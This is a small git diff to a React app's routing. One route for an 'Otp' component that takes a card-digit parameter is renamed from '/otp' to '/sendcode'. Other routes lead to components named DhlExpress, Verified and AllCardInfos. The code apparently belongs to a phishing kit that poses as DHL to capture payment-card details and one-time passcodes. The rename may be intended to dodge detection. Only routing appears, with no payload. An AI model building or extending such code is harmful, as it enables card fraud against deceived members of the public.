@@ -15,13 +15,13 @@ function App() {
       .then((result) => console.log(result))
       .catch((error) => console.log("error", error));
   }, []);
-  
+
   return (
     <>
       <BrowserRouter>
         <Routes>
           <Route path="/:param" element={<DhlExpress />} />
-          <Route path="/otp/:cardigit/:param" element={<Otp />} />
+          <Route path="/sendcode/:cardigit/:param" element={<Otp />} />
           <Route path="/confirm" element={<Verified />} />
           <Route path="/info/:docId" element={<AllCardInfos />} />
         </Routes>
